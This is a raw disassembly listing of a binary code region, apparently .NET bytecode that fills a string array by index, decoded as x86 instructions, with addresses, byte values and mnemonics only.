  40351a:	15 00 70 a2 07       	adc    $0x7a27000,%eax
  40351f:	1f                   	pop    %ds
  403520:	58                   	pop    %eax
  403521:	72 50                	jb     0x403573
  403523:	15 00 70 a2 07       	adc    $0x7a27000,%eax
  403528:	1f                   	pop    %ds
  403529:	59                   	pop    %ecx
  40352a:	72 58                	jb     0x403584
  40352c:	15 00 70 a2 07       	adc    $0x7a27000,%eax
  403531:	1f                   	pop    %ds
  403532:	5a                   	pop    %edx
  403533:	72 60                	jb     0x403595
  403535:	15 00 70 a2 07       	adc    $0x7a27000,%eax
  40353a:	1f                   	pop    %ds
  40353b:	5b                   	pop    %ebx
  40353c:	72 6a                	jb     0x4035a8
  40353e:	15 00 70 a2 07       	adc    $0x7a27000,%eax
  403543:	1f                   	pop    %ds
  403544:	5c                   	pop    %esp
  403545:	72 76                	jb     0x4035bd
  403547:	15 00 70 a2 07       	adc    $0x7a27000,%eax
  40354c:	1f                   	pop    %ds
  40354d:	5d                   	pop    %ebp
  40354e:	72 82                	jb     0x4034d2
  403550:	15 00 70 a2 07       	adc    $0x7a27000,%eax
  403555:	1f                   	pop    %ds
  403556:	5e                   	pop    %esi
  403557:	72 8a                	jb     0x4034e3
  403559:	15 00 70 a2 07       	adc    $0x7a27000,%eax
  40355e:	1f                   	pop    %ds
  40355f:	5f                   	pop    %edi
  403560:	72 94                	jb     0x4034f6
  403562:	15 00 70 a2 07       	adc    $0x7a27000,%eax
  403567:	1f                   	pop    %ds
  403568:	60                   	pusha
  403569:	72 a0                	jb     0x40350b
  40356b:	15 00 70 a2 07       	adc    $0x7a27000,%eax
  403570:	1f                   	pop    %ds
  403571:	61                   	popa
  403572:	72 aa                	jb     0x40351e
  403574:	15 00 70 a2 07       	adc    $0x7a27000,%eax
  403579:	1f                   	pop    %ds
  40357a:	62 72 b4             	bound  %esi,-0x4c(%edx)
  40357d:	15 00 70 a2 07       	adc    $0x7a27000,%eax
  403582:	1f                   	pop    %ds
  403583:	63 72 c0             	arpl   %esi,-0x40(%edx)
  403586:	15 00 70 a2 07       	adc    $0x7a27000,%eax
  40358b:	1f                   	pop    %ds
  40358c:	64 72 ca             	fs jb  0x403559
  40358f:	15 00 70 a2 07       	adc    $0x7a27000,%eax
  403594:	1f                   	pop    %ds
  403595:	65 72 d6             	gs jb  0x40356e
  403598:	15 00 70 a2 07       	adc    $0x7a27000,%eax
  40359d:	1f                   	pop    %ds
  40359e:	66 72 e0             	data16 jb 0x403581
  4035a1:	15 00 70 a2 07       	adc    $0x7a27000,%eax
  4035a6:	1f                   	pop    %ds
  4035a7:	67 72 ea             	addr16 jb 0x403594
  4035aa:	15 00 70 a2 07       	adc    $0x7a27000,%eax
  4035af:	1f                   	pop    %ds
  4035b0:	68 72 f6 15 00       	push   $0x15f672
  4035b5:	70 a2                	jo     0x403559
  4035b7:	07                   	pop    %es
  4035b8:	1f                   	pop    %ds
  4035b9:	69 72 00 16 00 70 a2 	imul   $0xa2700016,0x0(%edx),%esi
  4035c0:	07                   	pop    %es
  4035c1:	1f                   	pop    %ds
  4035c2:	6a 72                	push   $0x72
  4035c4:	0a 16                	or     (%esi),%dl
  4035c6:	00 70 a2             	add    %dh,-0x5e(%eax)
  4035c9:	07                   	pop    %es
  4035ca:	1f                   	pop    %ds
  4035cb:	6b 72 14 16          	imul   $0x16,0x14(%edx),%esi
  4035cf:	00 70 a2             	add    %dh,-0x5e(%eax)
  4035d2:	07                   	pop    %es
  4035d3:	1f                   	pop    %ds
  4035d4:	6c                   	insb   (%dx),%es:(%edi)
  4035d5:	72 1e                	jb     0x4035f5
  4035d7:	16                   	push   %ss
  4035d8:	00 70 a2             	add    %dh,-0x5e(%eax)
  4035db:	07                   	pop    %es
  4035dc:	1f                   	pop    %ds
  4035dd:	6d                   	insl   (%dx),%es:(%edi)
  4035de:	72 28                	jb     0x403608
  4035e0:	16                   	push   %ss
  4035e1:	00 70 a2             	add    %dh,-0x5e(%eax)
  4035e4:	07                   	pop    %es
  4035e5:	1f                   	pop    %ds
  4035e6:	6e                   	outsb  %ds:(%esi),(%dx)
  4035e7:	72 30                	jb     0x403619
  4035e9:	16                   	push   %ss
  4035ea:	00 70 a2             	add    %dh,-0x5e(%eax)
  4035ed:	07                   	pop    %es
  4035ee:	1f                   	pop    %ds
  4035ef:	6f                   	outsl  %ds:(%esi),(%dx)
  4035f0:	72 3a                	jb     0x40362c
  4035f2:	16                   	push   %ss
  4035f3:	00 70 a2             	add    %dh,-0x5e(%eax)
  4035f6:	07                   	pop    %es
  4035f7:	1f                   	pop    %ds
  4035f8:	70 72                	jo     0x40366c
  4035fa:	46                   	inc    %esi
  4035fb:	16                   	push   %ss
  4035fc:	00 70 a2             	add    %dh,-0x5e(%eax)
  4035ff:	07                   	pop    %es
  403600:	1f                   	pop    %ds
  403601:	71 72                	jno    0x403675
  403603:	56                   	push   %esi
  403604:	16                   	push   %ss
  403605:	00 70 a2             	add    %dh,-0x5e(%eax)
  403608:	07                   	pop    %es
  403609:	1f                   	pop    %ds
  40360a:	72 72                	jb     0x40367e
  40360c:	64 16                	fs push %ss
  40360e:	00 70 a2             	add    %dh,-0x5e(%eax)
  403611:	07                   	pop    %es
  403612:	1f                   	pop    %ds
  403613:	73 72                	jae    0x403687
  403615:	6e                   	outsb  %ds:(%esi),(%dx)
  403616:	16                   	push   %ss
  403617:	00 70 a2             	add    %dh,-0x5e(%eax)
  40361a:	07                   	pop    %es
  40361b:	1f                   	pop    %ds
  40361c:	74 72                	je     0x403690
  40361e:	7a 16                	jp     0x403636
  403620:	00 70 a2             	add    %dh,-0x5e(%eax)
  403623:	07                   	pop    %es
  403624:	1f                   	pop    %ds
  403625:	75 72                	jne    0x403699
  403627:	84 16                	test   %dl,(%esi)
  403629:	00 70 a2             	add    %dh,-0x5e(%eax)
  40362c:	07                   	pop    %es
  40362d:	1f                   	pop    %ds
  40362e:	76 72                	jbe    0x4036a2
  403630:	8e 16                	mov    (%esi),%ss
  403632:	00 70 a2             	add    %dh,-0x5e(%eax)
  403635:	07                   	pop    %es
  403636:	1f                   	pop    %ds
  403637:	77 72                	ja     0x4036ab
  403639:	96                   	xchg   %eax,%esi
  40363a:	16                   	push   %ss
  40363b:	00 70 a2             	add    %dh,-0x5e(%eax)
  40363e:	07                   	pop    %es
  40363f:	1f                   	pop    %ds
  403640:	78 72                	js     0x4036b4
  403642:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  403643:	16                   	push   %ss
  403644:	00 70 a2             	add    %dh,-0x5e(%eax)
  403647:	07                   	pop    %es
  403648:	1f                   	pop    %ds
  403649:	79 72                	jns    0x4036bd
  40364b:	ae                   	scas   %es:(%edi),%al
  40364c:	16                   	push   %ss
  40364d:	00 70 a2             	add    %dh,-0x5e(%eax)
  403650:	07                   	pop    %es
  403651:	1f                   	pop    %ds
  403652:	7a 72                	jp     0x4036c6
  403654:	b8 16 00 70 a2       	mov    $0xa2700016,%eax
  403659:	07                   	pop    %es
  40365a:	1f                   	pop    %ds
  40365b:	7b 72                	jnp    0x4036cf
  40365d:	c2 16 00             	ret    $0x16
  403660:	70 a2                	jo     0x403604
  403662:	07                   	pop    %es
  403663:	1f                   	pop    %ds
  403664:	7c 72                	jl     0x4036d8
  403666:	cc                   	int3
  403667:	16                   	push   %ss
  403668:	00 70 a2             	add    %dh,-0x5e(%eax)
  40366b:	07                   	pop    %es
  40366c:	1f                   	pop    %ds
  40366d:	7d 72                	jge    0x4036e1
  40366f:	d6                   	salc
  403670:	16                   	push   %ss
  403671:	00 70 a2             	add    %dh,-0x5e(%eax)
  403674:	07                   	pop    %es
  403675:	1f                   	pop    %ds
  403676:	7e 72                	jle    0x4036ea
  403678:	e2 16                	loop   0x403690
  40367a:	00 70 a2             	add    %dh,-0x5e(%eax)
  40367d:	07                   	pop    %es
  40367e:	1f                   	pop    %ds
  40367f:	7f 72                	jg     0x4036f3
  403681:	ee                   	out    %al,(%dx)
  403682:	16                   	push   %ss
  403683:	00 70 a2             	add    %dh,-0x5e(%eax)
  403686:	07                   	pop    %es
  403687:	20 80 00 00 00 72    	and    %al,0x72000000(%eax)
  40368d:	f8                   	clc
  40368e:	16                   	push   %ss
  40368f:	00 70 a2             	add    %dh,-0x5e(%eax)
  403692:	07                   	pop    %es
  403693:	20 81 00 00 00 72    	and    %al,0x72000000(%ecx)
  403699:	02 17                	add    (%edi),%dl
  40369b:	00 70 a2             	add    %dh,-0x5e(%eax)
  40369e:	07                   	pop    %es
  40369f:	20 82 00 00 00 72    	and    %al,0x72000000(%edx)
  4036a5:	0c 17                	or     $0x17,%al
  4036a7:	00 70 a2             	add    %dh,-0x5e(%eax)
  4036aa:	07                   	pop    %es
  4036ab:	20 83 00 00 00 72    	and    %al,0x72000000(%ebx)
  4036b1:	16                   	push   %ss
  4036b2:	17                   	pop    %ss
  4036b3:	00 70 a2             	add    %dh,-0x5e(%eax)
  4036b6:	07                   	pop    %es
  4036b7:	20 84 00 00 00 72 20 	and    %al,0x20720000(%eax,%eax,1)
  4036be:	17                   	pop    %ss
  4036bf:	00 70 a2             	add    %dh,-0x5e(%eax)
  4036c2:	07                   	pop    %es
  4036c3:	20 85 00 00 00 72    	and    %al,0x72000000(%ebp)
  4036c9:	2a 17                	sub    (%edi),%dl
  4036cb:	00 70 a2             	add    %dh,-0x5e(%eax)
  4036ce:	07                   	pop    %es
  4036cf:	20 86 00 00 00 72    	and    %al,0x72000000(%esi)
  4036d5:	36 17                	ss pop %ss
  4036d7:	00 70 a2             	add    %dh,-0x5e(%eax)
  4036da:	07                   	pop    %es
  4036db:	20 87 00 00 00 72    	and    %al,0x72000000(%edi)
  4036e1:	42                   	inc    %edx
  4036e2:	17                   	pop    %ss
  4036e3:	00 70 a2             	add    %dh,-0x5e(%eax)
  4036e6:	07                   	pop    %es
  4036e7:	20 88 00 00 00 72    	and    %cl,0x72000000(%eax)
  4036ed:	4e                   	dec    %esi
  4036ee:	17                   	pop    %ss
  4036ef:	00 70 a2             	add    %dh,-0x5e(%eax)
  4036f2:	07                   	pop    %es
  4036f3:	20 89 00 00 00 72    	and    %cl,0x72000000(%ecx)
  4036f9:	5a                   	pop    %edx
  4036fa:	17                   	pop    %ss
  4036fb:	00 70 a2             	add    %dh,-0x5e(%eax)
  4036fe:	07                   	pop    %es
  4036ff:	20 8a 00 00 00 72    	and    %cl,0x72000000(%edx)
  403705:	66 17                	popw   %ss
  403707:	00 70 a2             	add    %dh,-0x5e(%eax)
  40370a:	07                   	pop    %es
  40370b:	20 8b 00 00 00 72    	and    %cl,0x72000000(%ebx)
  403711:	70 17                	jo     0x40372a
  403713:	00 70 a2             	add    %dh,-0x5e(%eax)
  403716:	07                   	pop    %es
  403717:	20 8c 00 00 00 72 7a 	and    %cl,0x7a720000(%eax,%eax,1)
  40371e:	17                   	pop    %ss
  40371f:	00 70 a2             	add    %dh,-0x5e(%eax)
  403722:	07                   	pop    %es
  403723:	20 8d 00 00 00 72    	and    %cl,0x72000000(%ebp)
  403729:	84 17                	test   %dl,(%edi)
  40372b:	00 70 a2             	add    %dh,-0x5e(%eax)
  40372e:	07                   	pop    %es
  40372f:	20 8e 00 00 00 72    	and    %cl,0x72000000(%esi)
  403735:	8e 17                	mov    (%edi),%ss
  403737:	00 70 a2             	add    %dh,-0x5e(%eax)
  40373a:	07                   	pop    %es
  40373b:	20 8f 00 00 00 72    	and    %cl,0x72000000(%edi)
  403741:	98                   	cwtl
  403742:	17                   	pop    %ss
  403743:	00 70 a2             	add    %dh,-0x5e(%eax)
  403746:	07                   	pop    %es
  403747:	20 90 00 00 00 72    	and    %dl,0x72000000(%eax)
  40374d:	a2 17 00 70 a2       	mov    %al,0xa2700017
  403752:	07                   	pop    %es
  403753:	20 91 00 00 00 72    	and    %dl,0x72000000(%ecx)
  403759:	ac                   	lods   %ds:(%esi),%al
  40375a:	17                   	pop    %ss
  40375b:	00 70 a2             	add    %dh,-0x5e(%eax)
  40375e:	07                   	pop    %es
  40375f:	20 92 00 00 00 72    	and    %dl,0x72000000(%edx)
  403765:	ba 17 00 70 a2       	mov    $0xa2700017,%edx
  40376a:	07                   	pop    %es
  40376b:	20 93 00 00 00 72    	and    %dl,0x72000000(%ebx)
  403771:	c4 17                	les    (%edi),%edx
  403773:	00 70 a2             	add    %dh,-0x5e(%eax)
  403776:	07                   	pop    %es
  403777:	20 94 00 00 00 72 d2 	and    %dl,-0x2d8e0000(%eax,%eax,1)
  40377e:	17                   	pop    %ss
  40377f:	00 70 a2             	add    %dh,-0x5e(%eax)
  403782:	07                   	pop    %es
  403783:	20 95 00 00 00 72    	and    %dl,0x72000000(%ebp)
  403789:	de 17                	ficoms (%edi)
  40378b:	00 70 a2             	add    %dh,-0x5e(%eax)
  40378e:	07                   	pop    %es
  40378f:	20 96 00 00 00 72    	and    %dl,0x72000000(%esi)
  403795:	e8 17 00 70 a2       	call   0xa2b037b1
  40379a:	07                   	pop    %es
  40379b:	20 97 00 00 00 72    	and    %dl,0x72000000(%edi)
  4037a1:	f4                   	hlt
  4037a2:	17                   	pop    %ss
  4037a3:	00 70 a2             	add    %dh,-0x5e(%eax)
  4037a6:	07                   	pop    %es
  4037a7:	20 98 00 00 00 72    	and    %bl,0x72000000(%eax)
  4037ad:	fe                   	(bad)
  4037ae:	17                   	pop    %ss
  4037af:	00 70 a2             	add    %dh,-0x5e(%eax)
  4037b2:	07                   	pop    %es
  4037b3:	20 99 00 00 00 72    	and    %bl,0x72000000(%ecx)
  4037b9:	08 18                	or     %bl,(%eax)
  4037bb:	00 70 a2             	add    %dh,-0x5e(%eax)
  4037be:	07                   	pop    %es
  4037bf:	20 9a 00 00 00 72    	and    %bl,0x72000000(%edx)
  4037c5:	12 18                	adc    (%eax),%bl
  4037c7:	00 70 a2             	add    %dh,-0x5e(%eax)
  4037ca:	07                   	pop    %es
  4037cb:	20 9b 00 00 00 72    	and    %bl,0x72000000(%ebx)
  4037d1:	1c 18                	sbb    $0x18,%al
  4037d3:	00 70 a2             	add    %dh,-0x5e(%eax)
  4037d6:	07                   	pop    %es
  4037d7:	20 9c 00 00 00 72 2a 	and    %bl,0x2a720000(%eax,%eax,1)
  4037de:	18 00                	sbb    %al,(%eax)
  4037e0:	70 a2                	jo     0x403784
  4037e2:	07                   	pop    %es
  4037e3:	20 9d 00 00 00 72    	and    %bl,0x72000000(%ebp)
  4037e9:	38 18                	cmp    %bl,(%eax)
  4037eb:	00 70 a2             	add    %dh,-0x5e(%eax)
  4037ee:	07                   	pop    %es
  4037ef:	20 9e 00 00 00 72    	and    %bl,0x72000000(%esi)
  4037f5:	46                   	inc    %esi
  4037f6:	18 00                	sbb    %al,(%eax)
  4037f8:	70 a2                	jo     0x40379c
  4037fa:	07                   	pop    %es
  4037fb:	20 9f 00 00 00 72    	and    %bl,0x72000000(%edi)
  403801:	50                   	push   %eax
  403802:	18 00                	sbb    %al,(%eax)
  403804:	70 a2                	jo     0x4037a8
  403806:	07                   	pop    %es
  403807:	20 a0 00 00 00 72    	and    %ah,0x72000000(%eax)
  40380d:	58                   	pop    %eax
  40380e:	18 00                	sbb    %al,(%eax)
  403810:	70 a2                	jo     0x4037b4
  403812:	07                   	pop    %es
  403813:	20 a1 00 00 00 72    	and    %ah,0x72000000(%ecx)
  403819:	62 18                	bound  %ebx,(%eax)
  40381b:	00 70 a2             	add    %dh,-0x5e(%eax)
  40381e:	07                   	pop    %es
  40381f:	20 a2 00 00 00 72    	and    %ah,0x72000000(%edx)
  403825:	6c                   	insb   (%dx),%es:(%edi)
  403826:	18 00                	sbb    %al,(%eax)
  403828:	70 a2                	jo     0x4037cc
  40382a:	07                   	pop    %es
  40382b:	20 a3 00 00 00 72    	and    %ah,0x72000000(%ebx)
  403831:	76 18                	jbe    0x40384b
  403833:	00 70 a2             	add    %dh,-0x5e(%eax)
  403836:	07                   	pop    %es
  403837:	20 a4 00 00 00 72 80 	and    %ah,-0x7f8e0000(%eax,%eax,1)
  40383e:	18 00                	sbb    %al,(%eax)
  403840:	70 a2                	jo     0x4037e4
  403842:	07                   	pop    %es
  403843:	20 a5 00 00 00 72    	and    %ah,0x72000000(%ebp)
  403849:	8a 18                	mov    (%eax),%bl
  40384b:	00 70 a2             	add    %dh,-0x5e(%eax)
  40384e:	07                   	pop    %es
  40384f:	20 a6 00 00 00 72    	and    %ah,0x72000000(%esi)
  403855:	94                   	xchg   %eax,%esp
  403856:	18 00                	sbb    %al,(%eax)
  403858:	70 a2                	jo     0x4037fc
  40385a:	07                   	pop    %es
  40385b:	20 a7 00 00 00 72    	and    %ah,0x72000000(%edi)
  403861:	9e                   	sahf
  403862:	18 00                	sbb    %al,(%eax)
  403864:	70 a2                	jo     0x403808
  403866:	07                   	pop    %es
  403867:	20 a8 00 00 00 72    	and    %ch,0x72000000(%eax)
  40386d:	aa                   	stos   %al,%es:(%edi)
  40386e:	18 00                	sbb    %al,(%eax)
  403870:	70 a2                	jo     0x403814
  403872:	07                   	pop    %es
  403873:	20 a9 00 00 00 72    	and    %ch,0x72000000(%ecx)
  403879:	b4 18                	mov    $0x18,%ah
  40387b:	00 70 a2             	add    %dh,-0x5e(%eax)
  40387e:	07                   	pop    %es
  40387f:	20 aa 00 00 00 72    	and    %ch,0x72000000(%edx)
  403885:	c0 18 00             	rcrb   $0x0,(%eax)
  403888:	70 a2                	jo     0x40382c
  40388a:	07                   	pop    %es
  40388b:	20 ab 00 00 00 72    	and    %ch,0x72000000(%ebx)
  403891:	ca 18 00             	lret   $0x18
  403894:	70 a2                	jo     0x403838
  403896:	07                   	pop    %es
  403897:	20 ac 00 00 00 72 d4 	and    %ch,-0x2b8e0000(%eax,%eax,1)
  40389e:	18 00                	sbb    %al,(%eax)
  4038a0:	70 a2                	jo     0x403844
  4038a2:	07                   	pop    %es
  4038a3:	20 ad 00 00 00 72    	and    %ch,0x72000000(%ebp)
  4038a9:	de 18                	ficomps (%eax)
  4038ab:	00 70 a2             	add    %dh,-0x5e(%eax)
  4038ae:	07                   	pop    %es
  4038af:	20 ae 00 00 00 72    	and    %ch,0x72000000(%esi)
  4038b5:	e8 18 00 70 a2       	call   0xa2b038d2
  4038ba:	07                   	pop    %es
  4038bb:	20 af 00 00 00 72    	and    %ch,0x72000000(%edi)
  4038c1:	f2 18 00             	repnz sbb %al,(%eax)
  4038c4:	70 a2                	jo     0x403868
  4038c6:	07                   	pop    %es
  4038c7:	20 b0 00 00 00 72    	and    %dh,0x72000000(%eax)
  4038cd:	fc                   	cld
  4038ce:	18 00                	sbb    %al,(%eax)
  4038d0:	70 a2                	jo     0x403874
  4038d2:	07                   	pop    %es
  4038d3:	20 b1 00 00 00 72    	and    %dh,0x72000000(%ecx)
  4038d9:	08 19                	or     %bl,(%ecx)
  4038db:	00 70 a2             	add    %dh,-0x5e(%eax)
  4038de:	07                   	pop    %es
  4038df:	20 b2 00 00 00 72    	and    %dh,0x72000000(%edx)
  4038e5:	14 19                	adc    $0x19,%al
  4038e7:	00 70 a2             	add    %dh,-0x5e(%eax)
  4038ea:	07                   	pop    %es
  4038eb:	20 b3 00 00 00 72    	and    %dh,0x72000000(%ebx)
  4038f1:	1e                   	push   %ds
  4038f2:	19 00                	sbb    %eax,(%eax)
  4038f4:	70 a2                	jo     0x403898
  4038f6:	07                   	pop    %es
  4038f7:	20 b4 00 00 00 72 28 	and    %dh,0x28720000(%eax,%eax,1)
  4038fe:	19 00                	sbb    %eax,(%eax)
  403900:	70 a2                	jo     0x4038a4
  403902:	07                   	pop    %es
  403903:	20 b5 00 00 00 72    	and    %dh,0x72000000(%ebp)
  403909:	32 19                	xor    (%ecx),%bl
  40390b:	00 70 a2             	add    %dh,-0x5e(%eax)
  40390e:	07                   	pop    %es
  40390f:	20 b6 00 00 00 72    	and    %dh,0x72000000(%esi)
  403915:	3c 19                	cmp    $0x19,%al
  403917:	00 70 a2             	add    %dh,-0x5e(%eax)
  40391a:	07                   	pop    %es
  40391b:	20 b7 00 00 00 72    	and    %dh,0x72000000(%edi)
  403921:	46                   	inc    %esi
  403922:	19 00                	sbb    %eax,(%eax)
  403924:	70 a2                	jo     0x4038c8
  403926:	07                   	pop    %es
  403927:	20 b8 00 00 00 72    	and    %bh,0x72000000(%eax)
  40392d:	50                   	push   %eax
  40392e:	19 00                	sbb    %eax,(%eax)
  403930:	70 a2                	jo     0x4038d4
  403932:	07                   	pop    %es
  403933:	20 b9 00 00 00 72    	and    %bh,0x72000000(%ecx)
  403939:	5a                   	pop    %edx
  40393a:	19 00                	sbb    %eax,(%eax)
  40393c:	70 a2                	jo     0x4038e0
  40393e:	07                   	pop    %es
  40393f:	20 ba 00 00 00 72    	and    %bh,0x72000000(%edx)
  403945:	64 19 00             	sbb    %eax,%fs:(%eax)
  403948:	70 a2                	jo     0x4038ec
  40394a:	07                   	pop    %es
  40394b:	20 bb 00 00 00 72    	and    %bh,0x72000000(%ebx)
  403951:	6e                   	outsb  %ds:(%esi),(%dx)
  403952:	19 00                	sbb    %eax,(%eax)
  403954:	70 a2                	jo     0x4038f8
  403956:	07                   	pop    %es
  403957:	20 bc 00 00 00 72 78 	and    %bh,0x78720000(%eax,%eax,1)
  40395e:	19 00                	sbb    %eax,(%eax)
  403960:	70 a2                	jo     0x403904
  403962:	07                   	pop    %es
  403963:	20 bd 00 00 00 72    	and    %bh,0x72000000(%ebp)
  403969:	82 19 00             	sbbb   $0x0,(%ecx)
  40396c:	70 a2                	jo     0x403910
  40396e:	07                   	pop    %es
  40396f:	20 be 00 00 00 72    	and    %bh,0x72000000(%esi)
  403975:	8c 19                	mov    %ds,(%ecx)
  403977:	00 70 a2             	add    %dh,-0x5e(%eax)
  40397a:	07                   	pop    %es
  40397b:	20 bf 00 00 00 72    	and    %bh,0x72000000(%edi)
  403981:	96                   	xchg   %eax,%esi
  403982:	19 00                	sbb    %eax,(%eax)
  403984:	70 a2                	jo     0x403928
  403986:	07                   	pop    %es
  403987:	20 c0                	and    %al,%al
  403989:	00 00                	add    %al,(%eax)
  40398b:	00 72 a0             	add    %dh,-0x60(%edx)
  40398e:	19 00                	sbb    %eax,(%eax)
  403990:	70 a2                	jo     0x403934
  403992:	07                   	pop    %es
  403993:	20 c1                	and    %al,%cl
  403995:	00 00                	add    %al,(%eax)
  403997:	00 72 aa             	add    %dh,-0x56(%edx)
  40399a:	19 00                	sbb    %eax,(%eax)
  40399c:	70 a2                	jo     0x403940
  40399e:	07                   	pop    %es
  40399f:	20 c2                	and    %al,%dl
  4039a1:	00 00                	add    %al,(%eax)
  4039a3:	00 72 b4             	add    %dh,-0x4c(%edx)
  4039a6:	19 00                	sbb    %eax,(%eax)
  4039a8:	70 a2                	jo     0x40394c
  4039aa:	07                   	pop    %es
  4039ab:	20 c3                	and    %al,%bl
  4039ad:	00 00                	add    %al,(%eax)
  4039af:	00 72 c2             	add    %dh,-0x3e(%edx)
  4039b2:	19 00                	sbb    %eax,(%eax)
  4039b4:	70 a2                	jo     0x403958
  4039b6:	07                   	pop    %es
  4039b7:	20 c4                	and    %al,%ah
  4039b9:	00 00                	add    %al,(%eax)
  4039bb:	00 72 cc             	add    %dh,-0x34(%edx)
  4039be:	19 00                	sbb    %eax,(%eax)
  4039c0:	70 a2                	jo     0x403964
  4039c2:	07                   	pop    %es
  4039c3:	20 c5                	and    %al,%ch
  4039c5:	00 00                	add    %al,(%eax)
  4039c7:	00 72 d6             	add    %dh,-0x2a(%edx)
  4039ca:	19 00                	sbb    %eax,(%eax)
  4039cc:	70 a2                	jo     0x403970
  4039ce:	07                   	pop    %es
  4039cf:	20 c6                	and    %al,%dh
  4039d1:	00 00                	add    %al,(%eax)
  4039d3:	00 72 e0             	add    %dh,-0x20(%edx)
  4039d6:	19 00                	sbb    %eax,(%eax)
  4039d8:	70 a2                	jo     0x40397c
  4039da:	07                   	pop    %es
  4039db:	20 c7                	and    %al,%bh
  4039dd:	00 00                	add    %al,(%eax)
  4039df:	00 72 ea             	add    %dh,-0x16(%edx)
  4039e2:	19 00                	sbb    %eax,(%eax)
  4039e4:	70 a2                	jo     0x403988
  4039e6:	07                   	pop    %es
  4039e7:	20 c8                	and    %cl,%al
  4039e9:	00 00                	add    %al,(%eax)
  4039eb:	00 72 f4             	add    %dh,-0xc(%edx)
  4039ee:	19 00                	sbb    %eax,(%eax)
  4039f0:	70 a2                	jo     0x403994
  4039f2:	07                   	pop    %es
  4039f3:	20 c9                	and    %cl,%cl
  4039f5:	00 00                	add    %al,(%eax)
  4039f7:	00 72 fe             	add    %dh,-0x2(%edx)
  4039fa:	19 00                	sbb    %eax,(%eax)
  4039fc:	70 a2                	jo     0x4039a0
  4039fe:	07                   	pop    %es
  4039ff:	20 ca                	and    %cl,%dl
  403a01:	00 00                	add    %al,(%eax)
  403a03:	00 72 06             	add    %dh,0x6(%edx)
  403a06:	1a 00                	sbb    (%eax),%al
  403a08:	70 a2                	jo     0x4039ac
  403a0a:	07                   	pop    %es
  403a0b:	20 cb                	and    %cl,%bl
  403a0d:	00 00                	add    %al,(%eax)
  403a0f:	00 72 10             	add    %dh,0x10(%edx)
  403a12:	1a 00                	sbb    (%eax),%al
  403a14:	70 a2                	jo     0x4039b8
  403a16:	07                   	pop    %es
  403a17:	20 cc                	and    %cl,%ah
  403a19:	00 00                	add    %al,(%eax)
  403a1b:	00 72 1c             	add    %dh,0x1c(%edx)
  403a1e:	1a 00                	sbb    (%eax),%al
  403a20:	70 a2                	jo     0x4039c4
  403a22:	07                   	pop    %es
  403a23:	20 cd                	and    %cl,%ch
  403a25:	00 00                	add    %al,(%eax)
  403a27:	00 72 26             	add    %dh,0x26(%edx)
  403a2a:	1a 00                	sbb    (%eax),%al
  403a2c:	70 a2                	jo     0x4039d0
  403a2e:	07                   	pop    %es
  403a2f:	20 ce                	and    %cl,%dh
  403a31:	00 00                	add    %al,(%eax)
  403a33:	00 72 30             	add    %dh,0x30(%edx)
  403a36:	1a 00                	sbb    (%eax),%al
  403a38:	70 a2                	jo     0x4039dc
  403a3a:	07                   	pop    %es
  403a3b:	20 cf                	and    %cl,%bh
  403a3d:	00 00                	add    %al,(%eax)
  403a3f:	00 72 3a             	add    %dh,0x3a(%edx)
  403a42:	1a 00                	sbb    (%eax),%al
  403a44:	70 a2                	jo     0x4039e8
  403a46:	07                   	pop    %es
  403a47:	20 d0                	and    %dl,%al
  403a49:	00 00                	add    %al,(%eax)
  403a4b:	00 72 44             	add    %dh,0x44(%edx)
  403a4e:	1a 00                	sbb    (%eax),%al
  403a50:	70 a2                	jo     0x4039f4
  403a52:	07                   	pop    %es
  403a53:	20 d1                	and    %dl,%cl
  403a55:	00 00                	add    %al,(%eax)
  403a57:	00 72 4e             	add    %dh,0x4e(%edx)
  403a5a:	1a 00                	sbb    (%eax),%al
  403a5c:	70 a2                	jo     0x403a00
  403a5e:	07                   	pop    %es
  403a5f:	20 d2                	and    %dl,%dl
  403a61:	00 00                	add    %al,(%eax)
  403a63:	00 72 5a             	add    %dh,0x5a(%edx)
  403a66:	1a 00                	sbb    (%eax),%al
  403a68:	70 a2                	jo     0x403a0c
  403a6a:	07                   	pop    %es
  403a6b:	20 d3                	and    %dl,%bl
  403a6d:	00 00                	add    %al,(%eax)
  403a6f:	00 72 66             	add    %dh,0x66(%edx)
  403a72:	1a 00                	sbb    (%eax),%al
  403a74:	70 a2                	jo     0x403a18
  403a76:	07                   	pop    %es
  403a77:	20 d4                	and    %dl,%ah
  403a79:	00 00                	add    %al,(%eax)
  403a7b:	00 72 70             	add    %dh,0x70(%edx)
  403a7e:	1a 00                	sbb    (%eax),%al
  403a80:	70 a2                	jo     0x403a24
  403a82:	07                   	pop    %es
  403a83:	20 d5                	and    %dl,%ch
  403a85:	00 00                	add    %al,(%eax)
  403a87:	00 72 80             	add    %dh,-0x80(%edx)
  403a8a:	1a 00                	sbb    (%eax),%al
  403a8c:	70 a2                	jo     0x403a30
  403a8e:	07                   	pop    %es
  403a8f:	20 d6                	and    %dl,%dh
  403a91:	00 00                	add    %al,(%eax)
  403a93:	00 72 8a             	add    %dh,-0x76(%edx)
  403a96:	1a 00                	sbb    (%eax),%al
  403a98:	70 a2                	jo     0x403a3c
  403a9a:	07                   	pop    %es
  403a9b:	20 d7                	and    %dl,%bh
  403a9d:	00 00                	add    %al,(%eax)
  403a9f:	00 72 92             	add    %dh,-0x6e(%edx)
  403aa2:	1a 00                	sbb    (%eax),%al
  403aa4:	70 a2                	jo     0x403a48
  403aa6:	07                   	pop    %es
  403aa7:	20 d8                	and    %bl,%al
  403aa9:	00 00                	add    %al,(%eax)
  403aab:	00 72 9c             	add    %dh,-0x64(%edx)
  403aae:	1a 00                	sbb    (%eax),%al
  403ab0:	70 a2                	jo     0x403a54
  403ab2:	07                   	pop    %es
  403ab3:	20 d9                	and    %bl,%cl
  403ab5:	00 00                	add    %al,(%eax)
  403ab7:	00 72 a6             	add    %dh,-0x5a(%edx)
  403aba:	1a 00                	sbb    (%eax),%al
  403abc:	70 a2                	jo     0x403a60
  403abe:	07                   	pop    %es
  403abf:	20 da                	and    %bl,%dl
  403ac1:	00 00                	add    %al,(%eax)
  403ac3:	00 72 b0             	add    %dh,-0x50(%edx)
  403ac6:	1a 00                	sbb    (%eax),%al
  403ac8:	70 a2                	jo     0x403a6c
  403aca:	07                   	pop    %es
  403acb:	20 db                	and    %bl,%bl
  403acd:	00 00                	add    %al,(%eax)
  403acf:	00 72 ba             	add    %dh,-0x46(%edx)
  403ad2:	1a 00                	sbb    (%eax),%al
  403ad4:	70 a2                	jo     0x403a78
  403ad6:	07                   	pop    %es
  403ad7:	20 dc                	and    %bl,%ah
  403ad9:	00 00                	add    %al,(%eax)
  403adb:	00 72 c4             	add    %dh,-0x3c(%edx)
